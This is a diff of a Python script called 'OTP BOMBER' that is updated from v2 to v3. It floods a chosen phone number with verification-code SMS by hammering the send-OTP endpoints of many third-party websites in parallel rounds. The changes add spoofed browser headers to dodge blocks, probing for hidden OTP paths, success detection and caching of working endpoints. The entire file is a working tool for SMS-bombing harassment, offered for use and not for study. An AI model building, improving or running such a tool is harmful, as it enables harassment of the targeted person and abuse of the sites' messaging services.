@@ -1,40 +1,44 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-OTP BOMBER
-==========
+OTP BOMBER v3
+=============
 Enter phone number -> enter rounds -> done.
 
-Every round runs for a FULL 30 seconds and fires non-stop at every live
-site in sites.txt, in parallel. More live sites = more SMS per round.
+Fixes over v2:
+  * browser-like headers (Origin / Referer) -> fewer 403
+  * strict verdict: an HTML "200" no longer counts as success
+  * phone is ALWAYS sent in international format
+  * remembers working endpoints in alive.json
 
 sites.txt line format:
-    domain.com                                  <- tool hunts the endpoint
-    domain.com|/api/auth/send-otp               <- exact endpoint
-    domain.com|/api/auth/send-otp|phone|json    <- endpoint + field + style
-
-The tool TESTS every line on startup and keeps only the live ones.
+    https://site.com/api/send-otp|POST|{"phone":"{phone}"}
+    https://site.com/api/otp?mobile={phone}|GET|
+    https://site.com/api/auth/otp                (payload defaults to JSON)
+    site.com|/api/auth/otp                       (tool hunts the rest)
 """
 
+import json
 import os
 import re
 import sys
+import threading
 import time
 from concurrent.futures import (ThreadPoolExecutor, as_completed, wait,
                                 FIRST_COMPLETED)
+from urllib.parse import quote
 
 import requests
 
 # ----------------- settings -----------------
-WORKERS       = 100     # parallel requests in flight. 200 = faster
-ROUND_SECONDS = 30      # every round runs EXACTLY this long
-TIMEOUT       = 12      # per-request timeout
-COUNTRY_CODE  = "972"   # country prefix, no plus
-USE_PLUS      = False   # True -> send +972..., False -> send 972...
-PROBE_LIMIT   = 12      # paths tried when the endpoint is unknown
+WORKERS       = 80
+ROUND_SECONDS = 30
+TIMEOUT       = 10
+COUNTRY_CODE  = "972"
+PROBE_LIMIT   = 14
 
-UA = ("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 "
-      "(KHTML, like Gecko) Chrome/124.0 Mobile Safari/537.36")
+UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+      "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")
 
 
 def app_dir():
@@ -45,16 +49,25 @@ def app_dir():
 
 HERE = app_dir()
 SITES_FILE = os.path.join(HERE, "sites.txt")
+ALIVE_FILE = os.path.join(HERE, "alive.json")
 
 PROBE_PATHS = [
     "/api/auth/send-otp", "/api/auth/otp", "/api/send-otp", "/api/otp/send",
     "/api/v1/auth/otp", "/api/v1/send-otp", "/api/v1/auth/send-otp",
-    "/auth/send-otp", "/auth/otp", "/send-otp", "/otp/send", "/api/send-code",
+    "/api/v2/auth/otp", "/auth/send-otp", "/auth/otp", "/send-otp",
+    "/otp/send", "/api/send-code", "/api/user/send-otp",
 ]
+
+BAD_WORDS = ('"error"', '"success":false', '"status":false', '"ok":false',
+             '"valid":false', "invalid", "required", "not found", "expired",
+             "too many")
+OTP_WORDS = ("otp", "verification code", "one time", "one-time",
+             "send sms", "sent", "verification", "code")
 
 
 # ----------------- helpers -----------------
-def norm_phone(raw):
+def norm_phones(raw):
+    """returns international variants, most likely first"""
     p = re.sub(r"[^\d]", "", raw)
     if p.startswith(COUNTRY_CODE):
         intl = p
@@ -62,100 +75,180 @@ def norm_phone(raw):
         intl = COUNTRY_CODE + p[1:]
     else:
         intl = COUNTRY_CODE + p if len(p) <= 9 else p
-    return ("+" + intl) if USE_PLUS else intl
+    return [intl, "+" + intl]
+
+
+_local = threading.local()
+
+
+def sess():
+    s = getattr(_local, "s", None)
+    if s is None:
+        s = requests.Session()
+        _local.s = s
+    return s
+
+
+def headers_for(url):
+    try:
+        base = re.match(r"https?://[^/]+", url).group(0)
+    except Exception:
+        base = url
+    return {
+        "User-Agent": UA,
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9,he;q=0.8",
+        "Origin": base,
+        "Referer": base + "/",
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-dest": "empty",
+    }
+
+
+def parse_line(line):
+    """-> dict(url, method, payload) or None"""
+    parts = [x.strip() for x in line.split("|")]
+    first = parts[0]
+    if not first:
+        return None
+
+    method, payload, path = None, "", None
+    if len(parts) > 1 and parts[1]:
+        if parts[1].upper() in ("POST", "GET", "PUT"):
+            method = parts[1].upper()
+            payload = parts[2] if len(parts) > 2 else ""
+        elif parts[1].startswith("/"):
+            path = parts[1]
+            payload = parts[2] if len(parts) > 2 else ""
+        else:
+            payload = parts[1]
+
+    if not first.startswith("http"):
+        first = "https://" + first
+    first = first.rstrip("/")
+
+    if path:
+        urls = [first + path] + [first + p for p in PROBE_PATHS[:PROBE_LIMIT]]
+    elif first.count("/") == 2:
+        urls = [first + p for p in PROBE_PATHS[:PROBE_LIMIT]]
+    else:
+        urls = [first]
+
+    out = []
+    for u in urls:
+        out.append({
+            "url": u,
+            "method": method or ("GET" if "{phone}" in u else "POST"),
+            "payload": payload or '{"phone":"{phone}"}',
+        })
+    return out
 
 
 def load_sites():
-    sites = []
+    entries = []
     with open(SITES_FILE, encoding="utf-8") as f:
         for raw in f:
             line = raw.strip()
             if not line or line.startswith("#"):
                 continue
-            parts = [x.strip() for x in line.split("|")]
-            base = parts[0]
-            if not base.startswith("http"):
-                base = "https://" + base
-            sites.append({
-                "base":  base.rstrip("/"),
-                "path":  parts[1] if len(parts) > 1 and parts[1] else None,
-                "field": parts[2] if len(parts) > 2 and parts[2] else "phone",
-                "style": parts[3] if len(parts) > 3 and parts[3] else "json",
-            })
-    return sites
+            got = parse_line(line)
+            if got:
+                entries.extend(got)
+    return entries
 
 
-def fire(base, path, field, phone, style="json"):
-    """returns status code, or 0 on network error"""
-    url = base + path
-    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*"}
+# ----------------- the actual request -----------------
+def fire(ep, phone):
+    url = ep["url"].replace("{phone}", quote(phone, safe=""))
+    h = headers_for(ep["url"])
+    payload = ep.get("payload") or ""
+    method = ep.get("method", "POST").upper()
     try:
-        if style == "form":
-            h["Content-Type"] = "application/x-www-form-urlencoded"
-            r = requests.post(url, data={field: phone}, headers=h, timeout=TIMEOUT)
-        elif style == "query":
-            r = requests.get(url, params={field: phone}, headers=h, timeout=TIMEOUT)
-        else:
+        if method == "GET":
+            return sess().get(url, headers=h, timeout=TIMEOUT)
+        if payload.strip().startswith("{"):
             h["Content-Type"] = "application/json"
-            r = requests.post(url, json={field: phone}, headers=h, timeout=TIMEOUT)
-        return r.status_code
+            body = payload.replace("{phone}", phone)
+            return sess().post(url, data=body.encode(), headers=h, timeout=TIMEOUT)
+        if "=" in payload:
+            h["Content-Type"] = "application/x-www-form-urlencoded"
+            return sess().post(url, data=payload.replace("{phone}", phone),
+                               headers=h, timeout=TIMEOUT)
+        h["Content-Type"] = "application/json"
+        return sess().post(url, json={"phone": phone}, headers=h, timeout=TIMEOUT)
     except Exception:
-        return 0
+        return None
 
 
-def alive_code(code):
-    """for discovery: 2xx = works, 429 = works but throttled"""
-    return (200 <= code < 300) or code == 429
+def verdict(r):
+    """live = really sent | maybe = endpoint exists | dead = nothing there"""
+    if r is None:
+        return "dead"
+    c = r.status_code
+    if c in (404, 410):
+        return "dead"
+    if c == 429:
+        return "live"
+    if not (200 <= c < 300):
+        return "maybe"
+
+    ct = (r.headers.get("content-type") or "").lower()
+    body = (r.text or "")[:4000].lower()
+
+    if "json" in ct:
+        return "maybe" if any(b in body for b in BAD_WORDS) else "live"
+
+    # HTML page returned with 200 -> only trust it if it mentions OTP
+    if any(w in body for w in OTP_WORDS):
+        return "maybe"
+    return "dead"
 
 
 # ----------------- discovery -----------------
-def discover(sites, phone):
+def discover(entries):
+    phones = PHONES
     alive, near = [], []
-    print(f"\n[*] Testing {len(sites)} sites. This takes a moment...\n")
-    start = time.time()
+    done = 0
+    total = len(entries)
+    print(f"\n[*] Testing {total} endpoints...\n")
+    t0 = time.time()
 
-    def check(site):
-        tried = []
-        if site["path"]:
-            tried.append((site["path"], site["field"], site["style"]))
-        for p in PROBE_PATHS[:PROBE_LIMIT]:
-            if not site["path"] or p != site["path"]:
-                tried.append((p, "phone", "json"))
-        for path, field, style in tried:
-            code = fire(site["base"], path, field, phone, style)
-            if alive_code(code):
-                return (site["base"], path, field, style, code)
-        if tried:
-            code = fire(site["base"], tried[0][0], tried[0][1], phone, tried[0][2])
-            if 400 <= code < 500 and code != 404:
-                return ("NEAR", site["base"], tried[0][0], code)
-        return None
+    def check(ep):
+        for ph in phones:
+            r = fire(ep, ph)
+            v = verdict(r)
+            if v == "live":
+                return ("LIVE", ep, ph)
+            if v == "maybe":
+                near.append((ep, ph))
+        return ("DEAD", ep, phones[0])
 
     with ThreadPoolExecutor(max_workers=WORKERS) as ex:
-        futs = [ex.submit(check, s) for s in sites]
+        futs = [ex.submit(check, e) for e in entries]
         for fut in as_completed(futs):
-            res = fut.result()
-            if not res:
-                continue
-            if res[0] == "NEAR":
-                near.append(res)
-                print(f"  ~ {res[1]}{res[2]}   ({res[3]})")
-            else:
-                base, path, field, style, code = res
-                alive.append({"base": base, "path": path,
-                              "field": field, "style": style})
-                print(f"  + {base}{path}   [{code}]")
+            done += 1
+            kind, ep, ph = fut.result()
+            if kind == "LIVE":
+                alive.append({**ep, "phone": ph})
+                print(f"  + {ep['url']}")
+            if done % 25 == 0:
+                print(f"    ... {done}/{total}  ({time.time() - t0:.0f}s)")
 
-    print(f"\n[*] LIVE: {len(alive)} endpoints   |   "
-          f"near-miss: {len(near)}   |   {time.time() - start:.0f}s\n")
+    print(f"\n[*] LIVE: {len(alive)}   |   near-miss: {len(near)}   "
+          f"|   {time.time() - t0:.0f}s\n")
+    if alive:
+        with open(ALIVE_FILE, "w", encoding="utf-8") as f:
+            json.dump(alive, f, ensure_ascii=False, indent=1)
     return alive
 
 
 # ----------------- rounds -----------------
-def run_round(endpoints, phone, budget):
-    """fire NON-STOP at every live endpoint for `budget` seconds"""
+def run_round(endpoints, budget):
     deadline = time.time() + budget
-    stats = {"sent": 0, "ok": 0, "throttled": 0, "fail": 0}
+    st = {"sent": 0, "ok": 0, "thr": 0, "fail": 0}
     n = len(endpoints)
     idx = 0
     ex = ThreadPoolExecutor(max_workers=WORKERS)
@@ -168,8 +261,7 @@ def run_round(endpoints, phone, budget):
             while len(pending) < WORKERS and now < deadline:
                 e = endpoints[idx % n]
                 idx += 1
-                pending.add(ex.submit(fire, e["base"], e["path"],
-                                      e["field"], phone, e["style"]))
+                pending.add(ex.submit(fire, e, e.get("phone", PHONES[0])))
                 now = time.time()
 
             if not pending:
@@ -178,20 +270,22 @@ def run_round(endpoints, phone, budget):
             done, pending = wait(pending, timeout=0.15,
                                  return_when=FIRST_COMPLETED)
             for f in done:
-                stats["sent"] += 1
-                code = f.result()
-                if 200 <= code < 300:
-                    stats["ok"] += 1
-                elif code == 429:
-                    stats["throttled"] += 1
+                st["sent"] += 1
+                r = f.result()
+                if r is None:
+                    st["fail"] += 1
+                elif 200 <= r.status_code < 300:
+                    st["ok"] += 1
+                elif r.status_code == 429:
+                    st["thr"] += 1
                 else:
-                    stats["fail"] += 1
+                    st["fail"] += 1
 
             if time.time() - last >= 1.0:
                 last = time.time()
                 left = max(0.0, deadline - time.time())
-                print(f"\r      {left:4.1f}s left   sent {stats['sent']}   "
-                      f"ok {stats['ok']}   throttled {stats['throttled']}",
+                print(f"\r      {left:4.1f}s left   sent {st['sent']}   "
+                      f"ok {st['ok']}   throttled {st['thr']}",
                       end="", flush=True)
 
             if time.time() >= deadline and not pending:
@@ -199,70 +293,76 @@ def run_round(endpoints, phone, budget):
     finally:
         ex.shutdown(wait=False)
     print()
-    return stats
+    return st
 
 
 def main():
     print("=" * 56)
-    print("               O T P   B O M B E R")
+    print("               O T P   B O M B E R   v3")
     print("=" * 56)
 
     if not os.path.exists(SITES_FILE):
-        print("\n[X] sites.txt not found next to this program.")
+        print(f"\n[X] sites.txt not found.\n    expected here: {SITES_FILE}")
         input("\nPress Enter to exit...")
         return
 
-    sites = load_sites()
-    if not sites:
-        print("\n[X] sites.txt is empty.")
-        input("\nPress Enter to exit...")
+    raw = input("\nEnter phone number: ").strip()
+    if not raw:
         return
-
-    phone_raw = input("\nEnter phone number: ").strip()
-    if not phone_raw:
-        return
-    phone = norm_phone(phone_raw)
-    print(f"    -> will send as: {phone}")
+    global PHONES
+    PHONES = norm_phones(raw)
+    print(f"    -> will send as: {PHONES[0]}")
 
     try:
-        rounds = int(input("How many rounds: ").strip() or "1")
+        rounds = max(1, int(input("How many rounds: ").strip() or "1"))
     except ValueError:
         rounds = 1
-    rounds = max(1, rounds)
 
-    alive = discover(sites, phone)
+    # reuse a recent scan if sites.txt has not changed
+    alive = None
+    if os.path.exists(ALIVE_FILE) and \
+            os.path.getmtime(ALIVE_FILE) >= os.path.getmtime(SITES_FILE):
+        try:
+            with open(ALIVE_FILE, encoding="utf-8") as f:
+                alive = json.load(f)
+            print(f"[*] Reusing last scan: {len(alive)} live endpoints "
+                  f"(delete alive.json to rescan)")
+        except Exception:
+            alive = None
+
     if not alive:
-        print("[X] Nothing alive. Check your internet or the site list.")
+        alive = discover(load_sites())
+    if not alive:
+        print("[X] nothing alive.")
         input("\nPress Enter to exit...")
         return
 
     print(f"[*] {rounds} rounds x {ROUND_SECONDS}s = "
-          f"{rounds * ROUND_SECONDS}s of non-stop firing.")
-    print("[*] Ctrl+C to stop early.\n")
+          f"{rounds * ROUND_SECONDS}s of firing. Ctrl+C to stop.\n")
 
     t0 = time.time()
-    tot_ok = tot_sent = tot_thr = 0
+    tot = {"ok": 0, "sent": 0, "thr": 0}
     for r in range(1, rounds + 1):
         print(f"  Round {r}/{rounds}")
-        st = run_round(alive, phone, ROUND_SECONDS)
-        tot_ok += st["ok"]
-        tot_sent += st["sent"]
-        tot_thr += st["throttled"]
+        st = run_round(alive, ROUND_SECONDS)
+        for k in tot:
+            tot[k] += st[k]
         print(f"    -> sent {st['sent']}   ok {st['ok']}   "
-              f"throttled {st['throttled']}   fail {st['fail']}\n")
+              f"throttled {st['thr']}   fail {st['fail']}\n")
 
     el = time.time() - t0
     print("=" * 56)
-    print(f"  rounds          : {rounds}")
-    print(f"  requests sent   : {tot_sent}")
-    print(f"  successful SMS  : {tot_ok}")
-    print(f"  throttled (429) : {tot_thr}")
-    print(f"  total time      : {el:.0f}s")
-    if el > 0:
-        print(f"  speed           : {tot_ok / el:.1f} sms/sec")
+    print(f"  requests sent   : {tot['sent']}")
+    print(f"  successful SMS  : {tot['ok']}")
+    print(f"  throttled (429) : {tot['thr']}")
+    print(f"  time            : {el:.0f}s")
+    if el:
+        print(f"  speed           : {tot['ok'] / el:.1f} sms/sec")
     print("=" * 56)
     input("\nPress Enter to exit...")
 
+
+PHONES = ["972"]
 
 if __name__ == "__main__":
     try:
